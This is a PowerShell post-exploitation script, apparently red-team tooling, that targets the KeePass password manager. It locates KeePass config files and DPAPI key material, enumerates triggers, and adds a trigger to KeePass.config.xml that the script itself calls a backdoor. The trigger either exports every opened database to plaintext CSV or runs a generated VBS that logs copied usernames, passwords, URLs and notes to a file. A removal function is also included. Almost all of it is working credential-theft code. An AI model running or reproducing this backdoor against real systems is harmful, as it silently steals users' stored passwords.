#requires -version 2

function Find-KeePassconfig {
<#
    .SYNOPSIS

        Finds and parses any KeePass.config.xml (2.X) and KeePass.ini (1.X) files.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This function searches for any KeePass.config.xml (KeePass 2.X) and KeePass.ini (1.X) files in C:\Users\
        and C:\Program Files[x86]\ by default, or any path specified by -Path. For any files found, it will 
        parse the XML and output information relevant to the database location and keyfile/user master key information.

    .PARAMETER Path

        Optional path to a KeePass.config.xml/KeePass.ini file or specific folder to search for KeePass config files.

    .EXAMPLE

        PS C:\> Find-KeePassconfig

        DefaultDatabasePath    : C:\Users\testuser\Desktop\Database2.kdb
        SecureDesktop          :
        LastUsedFile           : C:\Users\testuser\Desktop\Database3.kdb
        DefaultKeyFilePath     : C:\Users\testuser\Desktop\k.bin
        DefaultUserAccountData :
        RecentlyUsed           : {C:\Users\testuser\Desktop\Database3.kdb, C:\Users\testuser\Desktop\k2.bin}
        KeePassConfigPath      : C:\Users\testuser\Desktop\blah\KeePass-1.31\KeePass.ini

        DefaultDatabasePath    : C:\Users\testuser\Desktop\NewDatabase.kdbx
        SecureDesktop          : False
        LastUsedFile           : C:\Users\testuser\Desktop\NewDatabase.kdbx
        DefaultKeyFilePath     : C:\Users\testuser\Desktop\blah\KeePass-2.34\KeePass.chm
        DefaultUserAccountData : @{UserDomain=TESTLAB; UserKeePassDPAPIBlob=C:\Users\testuser\AppData\Roaming\KeePass\Protected
                                 UserKey.bin; UserSid=S-1-5-21-456218688-4216621462-1491369290-1210; UserName=testuser; UserMas
                                 terKeyFiles=System.Object[]}
        RecentlyUsed           : {C:\Users\testuser\Desktop\NewDatabase.kdbx}
        KeePassConfigPath      : C:\Users\testuser\Desktop\blah\KeePass-2.34\KeePass.config.xml
#>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('FullName')]
        [String[]]
        $Path
    )

    BEGIN {

        function local:Get-IniContent {
        <#
            .SYNOPSIS

                This helper parses an .ini file into a proper PowerShell object.

                Author: 'The Scripting Guys'
                Link: https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/

            .LINK

                https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
        #>
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
                [Alias('FullName')]
                [ValidateScript({ Test-Path -Path $_ })]
                [String[]]
                $Path
            )

            PROCESS {
                ForEach($TargetPath in $Path) {
                    $IniObject = @{}
                    Switch -Regex -File $TargetPath {
                        "^\[(.+)\]" # Section
                        {
                            $Section = $matches[1].Trim()
                            $IniObject[$Section] = @{}
                            $CommentCount = 0
                        }
                        "^(;.*)$" # Comment
                        {
                            $Value = $matches[1].Trim()
                            $CommentCount = $CommentCount + 1
                            $Name = 'Comment' + $CommentCount
                            $IniObject[$Section][$Name] = $Value
                        }
                        "(.+?)\s*=(.*)" # Key
                        {
                            $Name, $Value = $matches[1..2]
                            $Name = $Name.Trim()
                            $Values = $Value.split(',') | ForEach-Object {$_.Trim()}
                            if($Values -isnot [System.Array]) {$Values = @($Values)}
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                    $IniObject
                }
            }
        }

        function Local:Get-KeePassINIFields {
            # helper that parses a 1.X KeePass.ini into a custom object
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [ValidateScript({ Test-Path -Path $_ })]
                [String]
                $Path
            )

            $KeePassINIPath = Resolve-Path -Path $Path
            $KeePassINIPathParent = $KeePassINIPath | Split-Path -Parent
            $KeePassINI = Get-IniContent -Path $KeePassINIPath
            $RecentlyUsed = @()

            try {
                if($KeePassINI.KeePass.KeeLastDb) {
                    $LastUsedFile = Resolve-Path -Path "$KeePassINIPathParent\$($KeePassINI.KeePass.KeeLastDb)" -ErrorAction Stop
                }
            }
            catch {}

            try {
                if($KeePassINI.KeePass.KeeKeySourceID0) {
                    $DefaultDatabasePath = Resolve-Path -Path $KeePassINI.KeePass.KeeKeySourceID0 -ErrorAction SilentlyContinue
                }
            }
            catch {}

            try {
                if($KeePassINI.KeePass.KeeKeySourceValue0) {
                    $DefaultKeyFilePath = Resolve-Path -Path $KeePassINI.KeePass.KeeKeySourceValue0 -ErrorAction SilentlyContinue
                }
            }
            catch {}

            # grab any additional cached databases/key information
            $KeePassINI.KeePass.Keys | Where-Object {$_ -match 'KeeKeySourceID[1-9]+'} | Foreach-Object {
                try {
                    $ID = $_[-1]
                    $RecentlyUsed += $KeePassINI.Keepass["KeeKeySourceID${ID}"]
                    $RecentlyUsed += $KeePassINI.Keepass["KeeKeySourceValue${ID}"]
                }
                catch{}
            }

            $KeePassINIProperties = @{
                'KeePassConfigPath' = $KeePassINIPath
                'SecureDesktop' = $Null
                'LastUsedFile' = $LastUsedFile
                'RecentlyUsed' = $RecentlyUsed
                'DefaultDatabasePath' = $DefaultDatabasePath
                'DefaultKeyFilePath' = $DefaultKeyFilePath
                'DefaultUserAccountData' = $Null
            }
            $KeePassINIInfo = New-Object -TypeName PSObject -Property $KeePassINIProperties
            $KeePassINIInfo.PSObject.TypeNames.Insert(0, 'KeePass.Config')
            $KeePassINIInfo
        }

        function Local:Get-KeePassXMLFields {
            # helper that parses a 2.X KeePass.config.xml into a custom object
            [CmdletBinding()]
            Param (
                [Parameter(Mandatory=$True)]
                [ValidateScript({ Test-Path -Path $_ })]
                [String]
                $Path
            )

            $KeePassXMLPath = Resolve-Path -Path $Path
            $KeePassXMLPathParent = $KeePassXMLPath | Split-Path -Parent
            [Xml]$KeePassXML = Get-Content -Path $KeePassXMLPath

            $LastUsedFile = ''
            $RecentlyUsed = @()
            $DefaultDatabasePath = ''
            $DefaultKeyFilePath = ''
            $DefaultUserAccountData = $Null

            if($KeePassXML.Configuration.Application.LastUsedFile) {
                $LastUsedFile = Resolve-Path -Path "$KeePassXMLPathParent\$($KeePassXML.Configuration.Application.LastUsedFile.Path)" -ErrorAction SilentlyContinue
            }

            if($KeePassXML.Configuration.Application.MostRecentlyUsed.Items) {
                $KeePassXML.Configuration.Application.MostRecentlyUsed.Items | Foreach-Object {
                    Resolve-Path -Path "$KeePassXMLPathParent\$($_.ConnectionInfo.Path)" -ErrorAction SilentlyContinue | Foreach-Object {
                        $RecentlyUsed += $_
                    }
                }
            }

            if($KeePassXML.Configuration.Defaults.KeySources.Association.DatabasePath) {
                $DefaultDatabasePath = Resolve-Path -Path "$KeePassXMLPathParent\$($KeePassXML.Configuration.Defaults.KeySources.Association.DatabasePath)" -ErrorAction SilentlyContinue
            }

            if($KeePassXML.Configuration.Defaults.KeySources.Association.KeyFilePath) {
                $DefaultKeyFilePath = Resolve-Path -Path "$KeePassXMLPathParent\$($KeePassXML.Configuration.Defaults.KeySources.Association.KeyFilePath)" -ErrorAction SilentlyContinue
            }

            $DefaultUserAccount = $KeePassXML.Configuration.Defaults.KeySources.Association.UserAccount -eq 'true'

            $SecureDesktop = $KeePassXML.Configuration.Security.MasterKeyOnSecureDesktop -eq 'true'

            if($DefaultUserAccount) {

                $UserPath = $Path.Split('\')[0..2] -join '\'

                $UserMasterKeyFolder = Get-ChildItem -Path "$UserPath\AppData\Roaming\Microsoft\Protect\" -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName

                if($UserMasterKeyFolder) {

                    $UserSid = $UserMasterKeyFolder | Split-Path -Leaf

                    try {
                        $UserSidObject = (New-Object System.Security.Principal.SecurityIdentifier($UserSid))
                        $UserNameDomain = $UserSidObject.Translate([System.Security.Principal.NTAccount]).Value

                        $UserDomain, $UserName = $UserNameDomain.Split('\')
                    }
                    catch {
                        Write-Warning "Unable to translate SID from $UserMasterKeyFolder , defaulting to user name"
                        $UserName = $UserPath.Split('\')[-1]
                        $UserDomain = $Null
                    }

                    $UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )
                }
                else {
                    $UserSid = $Null
                    $UserName = $Null
                    $UserDomain = $Null
                }

                $UserKeePassDPAPIBlob = Get-Item -Path "$UserPath\AppData\Roaming\KeePass\ProtectedUserKey.bin" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName

                $UserMasterKeyProperties = @{
                    'UserSid' = $UserSid
                    'UserName' = $UserName
                    'UserDomain' = $UserDomain
                    'UserKeePassDPAPIBlob' = $UserKeePassDPAPIBlob
                    'UserMasterKeyFiles' = $UserMasterKeyFiles
                }
                $DefaultUserAccountData = New-Object -TypeName PSObject -Property $UserMasterKeyProperties
            }

            $KeePassXmlProperties = @{
                'KeePassConfigPath' = $KeePassXMLPath
                'SecureDesktop' = $SecureDesktop
                'LastUsedFile' = $LastUsedFile
                'RecentlyUsed' = $RecentlyUsed
                'DefaultDatabasePath' = $DefaultDatabasePath
                'DefaultKeyFilePath' = $DefaultKeyFilePath
                'DefaultUserAccountData' = $DefaultUserAccountData
            }
            $KeePassXmlInfo = New-Object -TypeName PSObject -Property $KeePassXmlProperties
            $KeePassXmlInfo.PSObject.TypeNames.Insert(0, 'KeePass.Config')
            $KeePassXmlInfo
        }
    }

    PROCESS {
        if($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            # possible locations for KeePass configs
            $XmlFilePaths = @("$($Env:WinDir | Split-Path -Qualifier)\Users\")
            $XmlFilePaths += "${env:ProgramFiles(x86)}\"
            $XmlFilePaths += "${env:ProgramFiles}\"
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include @('KeePass.config.xml', 'KeePass.ini') -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing KeePass config file '$($_.Fullname)'"

            if($_.Extension -eq '.xml') {
                Get-KeePassXMLFields -Path $_.Fullname
            }
            else {
                Get-KeePassINIFields -Path $_.Fullname
            }
        }
    }
}


function Get-KeePassConfigTrigger {
<#
    .SYNOPSIS

        Extracts out the trigger specifications from a KeePass 2.X configuration XML file.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        This function takes a the path to a KeePass.config.xml file or the input from Find-KeePassConfig,
        reads the configuration XML, replaces event/action GUIDs with their readable names, and outputs
        each trigger as a custom PSObject.

    .PARAMETER Path

        Required path to a KeePass.config.xml file or an object result from Find-KeePassConfig.

    .EXAMPLE

        PS C:\> $Triggers = Find-KeePassconfig | Get-KeePassConfigTrigger
        PS C:\> $Triggers


        KeePassXMLPath : C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.config.xml
        Guid           : pagwKjmh8U6WbcplUbQnKg==
        Name           : blah
        Enabled        : false
        InitiallyOn    : false
        Events         : Events
        Conditions     :
        Actions        : Actions



        PS C:\> $Triggers.Events.Event

        Name                 Parameters
        ----                 ----------
        Opened database file Parameters


        PS C:\> $Triggers.Actions.Action

        Name                   Parameters
        ----                   ----------
        Export active database Parameters
#>
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Object[]]
        $Path
    )
    BEGIN {
        $EventGUIDs = @{
            '1M7NtUuYT/KmqeJVJh7I6A==' = 'Application initialized'
            '2PMe6cxpSBuJxfzi6ktqlw==' = 'Application started and ready'
            'goq3q7EcTr+AOTY/kXGXeA==' = 'Application exit'
            '5f8TBoW4QYm5BvaeKztApw==' = 'Opened database file'
            'lcGm/XJ8QMei+VsPoJljHA==' = 'Saving database file'
            's6j9/ngTSmqcXdW6hDqbjg==' = 'Saved database file'
            'jOremqgXSRmjL/QeOx3sSQ==' = 'Closing database file (before saving)'
            'lPpw5bE/QSamTgZP2MNslQ==' = 'Closing database file (after saving)'
            'P35exipUTFiVRIX78m9W3A==' = 'Copied entry data to clipboard'
            'jRLUmvLLT/eo78/arGJomQ==' = 'User interface state updated'
            'R0dZkpenQ6K5aB8fwvebkg==' = 'Custom toolbar button clicked'
        }

        $ActionGUIDs = @{
            '2uX4OwcwTBOe7y66y27kxw==' = 'Execute command line / URL'
            'tkamn96US7mbrjykfswQ6g==' = 'Change trigger on/off state'
            '/UFV1XmPRPqrifL4cO+UuA==' = 'Open database file'
            '9VdhS/hMQV2pE3o5zRDwvQ==' = 'Save active database'
            'Iq135Bd4Tu2ZtFcdArOtTQ==' = 'Synchronize active database with a file/URL'
            'gOZ/TnLxQEWRdh8sI9jsvg==' = 'Import into active database'
            'D5prW87VRr65NO2xP5RIIg==' = 'Export active database'
            'W79FnVS/Sb2X+yzuX5kKZw==' = 'Close active database'
            'P7gzLdYWToeZBWTbFkzWJg==' = 'Activate database (select tab)'
            'Oz0+MeSzQqa6zNXAO6ypaQ==' = 'Wait'
            'CfePcyTsT+yItiXVMPQ0bg==' = 'Show message box'
            'QGmlNlcbR5Kps3NlMODPww==' = 'Perform global auto-type'
            'MXCPrWSTQ/WU7sgaI24yTQ==' = 'Perform auto-type with selected entry'
            'Qug3gXPTTuyBSJ47NqyDhA==' = 'Show entries by tag'
            'lYGPRZlmSYirPoboGpZoNg==' = 'Add custom toolbar button'
            '1m1BomyyRLqkSApB+glIeQ==' = 'Remove custom toolbar button'
        }
    }
    PROCESS {

        ForEach($Object in $Path) {
            if($Object -is [String]) {
                $KeePassXMLPath = $Object
            }
            elseif ($Object.PSObject.Properties['KeePassConfigPath']) {
                $KeePassXMLPath = [String]$Object.KeePassConfigPath
            }
            elseif ($Object.PSObject.Properties['Path']) {
                $KeePassXMLPath = [String]$Object.Path
            }
            elseif ($Object.PSObject.Properties['FullName']) {
                $KeePassXMLPath = [String]$Object.FullName
            }
            else {
                $KeePassXMLPath = [String]$Object
            }

            if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
                $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath

                $KeePassXML = ([xml](Get-Content -Path $KeePassXMLPath)).InnerXml
                
                $EventGUIDs.Keys | Foreach-Object {
                    $KeePassXML = $KeePassXML.Replace($_, $EventGUIDs[$_])
                }

                $ActionGUIDs.Keys | Foreach-Object {
                    $KeePassXML = $KeePassXML.Replace($_, $ActionGUIDs[$_])
                }
                $KeePassXML = $KeePassXML.Replace('TypeGuid', 'Name')
                $KeePassXML = [xml]$KeePassXML

                $Triggers = $KeePassXML.SelectNodes('Configuration/Application/TriggerSystem/Triggers')
                
                $Triggers | Select-Object -Expand Trigger -ErrorAction SilentlyContinue | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'KeePass.Trigger')
                    $_ | Add-Member Noteproperty 'KeePassConfigPath' $KeePassXMLPath.Path
                    $_
                }
            }
        }
    }
}


function Add-KeePassConfigTrigger {
<#
    .SYNOPSIS

        Adds a KeePass exfiltration trigger to a KeePass.config.xml path or result from Find-KeePassConfig.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Inserts a custom KeePass.config.xml trigger into a KeePass file location. The trigger -Action can either
        export a database to $ExportPath whenever a database is open ('ExportDatabase') or write an data copied on the
        clipboard from KeePass to $ExportPath ('ExfilDataCopied').

    .PARAMETER Path

        Required path to a KeePass.config.xml file or an object result from Find-KeePassConfig.

    .PARAMETER Action

        Either 'ExportDatabase' (export opened databases to $ExportPath) or 'ExfilDataCopied' (export
        copied data to $ExportPath).

    .PARAMETER ExportPath

        The path to export data and/or the $TriggerName.vbs to.
    
    .PARAMETER TriggerName

        The name for the trigger, default to 'Debug'.

    .EXAMPLE

        PS C:\> 'C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.config.xml' | Find-KeePassconfig | Add-KeePassConfigTrigger -Verbose
        VERBOSE: KeePass XML set to export database to C:\Users\harmj0y.TESTLAB\AppData\Roaming\KeePass
        VERBOSE: C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.config.xml backdoored
        PS C:\> Find-KeePassconfig C:\Users\ | Get-KeePassConfigTrigger


        KeePassConfigPath : C:\Users\harmj0y.TESTLAB\Desktop\keepass\KeePass-2.34\KeePass.config.xml
        Guid              : PtbQvEQp00KFSqVteVdBew==
        Name              : Debug
        Events            : Events
        Conditions        :
        Actions           : Actions
#>
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Object[]]
        $Path,

        [Parameter(Position = 1)]
        [ValidateSet('ExportDatabase', 'ExfilDataCopied')]
        [String]
        $Action = 'ExportDatabase',

        [Parameter(Position = 2)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ExportPath = "${Env:APPDATA}\KeePass",

        [Parameter(Position = 3)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TriggerName = 'Debug'
    )
    BEGIN {

        $ExportPathFolder = Resolve-Path -Path $ExportPath -ErrorAction Stop
        if ((Get-Item -Path $ExportPathFolder) -isnot [System.IO.DirectoryInfo]) {
            throw 'ExportPath must be a directory!'
        }

        if($Action -eq 'ExportDatabase') {
            # 'Opened database file'
            $EventTriggerGUID = '5f8TBoW4QYm5BvaeKztApw=='

            # 'Export active database'
            $ActionGUID = 'D5prW87VRr65NO2xP5RIIg=='

            $TriggerXML = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([System.GUID]::NewGuid().ToByteArray()))</Guid>
    <Name>$TriggerName</Name>
    <Events>
        <Event>
            <TypeGuid>$EventTriggerGUID</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>$ActionGUID</TypeGuid>
            <Parameters>
                <Parameter>$($ExportPath)\{DB_BASENAME}.csv</Parameter>
                <Parameter>KeePass CSV (1.x)</Parameter>
                <Parameter />
                <Parameter />
            </Parameters>
        </Action>
    </Actions>
</Trigger>
"@
            
            Write-Verbose "KeePass XML set to export database to $ExportPath"
        }
        else {
            # 'ExfilDataCopied'

            # 'Copied entry data to clipboard'
            $EventTriggerGUID = 'P35exipUTFiVRIX78m9W3A=='

            # 'Execute command line / URL'
            $ActionGUID = '2uX4OwcwTBOe7y66y27kxw=='

            $ExfilVBSLocation = "$ExportPath\$($TriggerName).vbs"

            # write out VBS to location above
            $ExfilVBS = @"
Set objArgs = Wscript.Arguments
Dim oFS : Set oFS = CreateObject("Scripting.FileSystemObject")
Dim objFile : Set objFile = oFS.OpenTextFile("$ExportPath\$($TriggerName).txt", 8, True)
For Each strArg in objArgs
    objFile.Write strArg & ","
Next
objFile.Write vbCrLf
objFile.Close
"@
            
            $ExfilVBS | Out-File -Encoding ASCII -FilePath $ExfilVBSLocation
            Write-Verbose "Exfil VBS output to $ExfilVBSLocation set to export data to $ExportPath\$($TriggerName).txt"

            $TriggerXML = [xml] @"
<Trigger>
    <Guid>$([Convert]::ToBase64String([System.GUID]::NewGuid().ToByteArray()))</Guid>
    <Name>$TriggerName</Name>
    <Events>
        <Event>
            <TypeGuid>$EventTriggerGUID</TypeGuid>
            <Parameters>
                <Parameter>0</Parameter>
                <Parameter />
            </Parameters>
        </Event>
    </Events>
    <Conditions />
    <Actions>
        <Action>
            <TypeGuid>$ActionGUID</TypeGuid>
            <Parameters>
                <Parameter>%WINDIR%\System32\wscript.exe</Parameter>
                <Parameter>$ExfilVBSLocation "{TITLE}" "{URL}" "{USERNAME}" "{PASSWORD}" "{NOTES}"</Parameter>
                <Parameter>False</Parameter>
            </Parameters>
        </Action>
    </Actions>
</Trigger>
"@

            Write-Verbose "KeePass XML set to trigger $ExfilVBSLocation"
        }
    }

    PROCESS {

        ForEach($Object in $Path) {
            if($Object -is [String]) {
                $KeePassXMLPath = $Object
            }
            elseif ($Object.PSObject.Properties['KeePassConfigPath']) {
                $KeePassXMLPath = [String]$Object.KeePassConfigPath
            }
            elseif ($Object.PSObject.Properties['Path']) {
                $KeePassXMLPath = [String]$Object.Path
            }
            elseif ($Object.PSObject.Properties['FullName']) {
                $KeePassXMLPath = [String]$Object.FullName
            }
            else {
                $KeePassXMLPath = [String]$Object
            }

            if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
                $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath

                $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
                
                $RandomGUID = [System.GUID]::NewGuid().ToByteArray()

                if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
                    $Triggers = $KeePassXML.CreateElement('Triggers')
                    $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
                }
                else {
                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
                }

                $KeePassXML.Save($KeePassXMLPath)

                Write-Verbose "$KeePassXMLPath backdoored"
            }
        }
    }
}


function Remove-KeePassConfigTrigger {
<#
    .SYNOPSIS

        Removes a KeePass exfiltration trigger to a KeePass.config.xml path or result from Find-KeePassConfig.

        Author: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        Removes any custom a custom KeePass.config.xml trigger into a KeePass file location. The trigger -Action can either
        export a database to $ExportPath whenever a database is open ('ExportDatabase') or write an data copied on the
        clipboard from KeePass to $ExportPath ('ExfilDataCopied').

    .PARAMETER Path

        Required path to a KeePass.config.xml file or an object result from Find-KeePassConfig.

    .PARAMETER Action

        Either 'ExportDatabase' (export opened databases to $ExportPath) or 'ExfilDataCopied' (export
        copied data to $ExportPath).

    .PARAMETER ExportPath

        The path to export data and/or the $TriggerName.vbs to.
    
    .PARAMETER TriggerName

        The name for the trigger, default to 'Debug'.

    .EXAMPLE

        PS C:\> Find-KeePassconfig C:\users\ | Remove-KeePassConfigTrigger


        Guid       : wEIpZ61vk0yV5uENe5z0oA==
        Name       : Debug
        Events     : Events
        Conditions :
        Actions    : Actions



        PS C:\> Find-KeePassconfig C:\users\ | Get-KeePassConfigTrigger
        PS C:\>
#>
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Object[]]
        $Path,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TriggerName = '*'
    )

    PROCESS {
        
        ForEach($Object in $Path) {
            
            if($Object -is [String]) {
                $KeePassXMLPath = $Object
            }
            elseif ($Object.PSObject.Properties['KeePassConfigPath']) {
                $KeePassXMLPath = [String]$Object.KeePassConfigPath
            }
            elseif ($Object.PSObject.Properties['Path']) {
                $KeePassXMLPath = [String]$Object.Path
            }
            elseif ($Object.PSObject.Properties['FullName']) {
                $KeePassXMLPath = [String]$Object.FullName
            }
            else {
                $KeePassXMLPath = [String]$Object
            }
            
            Write-Verbose "KeePassXMLPath: $KeePassXMLPath"

            if($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath) ) {
                $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath

                $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
                
                $RandomGUID = [System.GUID]::NewGuid().ToByteArray()

                if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -isnot [String]) {

                    $Children = $KeePassXML.Configuration.Application.TriggerSystem.Triggers | ForEach-Object {$_.Trigger} | Where-Object {$_.Name -like $TriggerName}
                    Write-Verbose "Removing triggers matching name $TriggerName"
                    ForEach($Child in $Children) {
                        $KeePassXML.Configuration.Application.TriggerSystem.Triggers.RemoveChild($Child)
                    }
                }
                try {
                    $KeePassXML.Save($KeePassXMLPath)
                    Write-Verbose "$KeePassXMLPath triggers removed"
                }
                catch {
                    Write-Warning "Error setting path $KeePassXMLPath : $_"
                }
                
            }
        }
    }
}
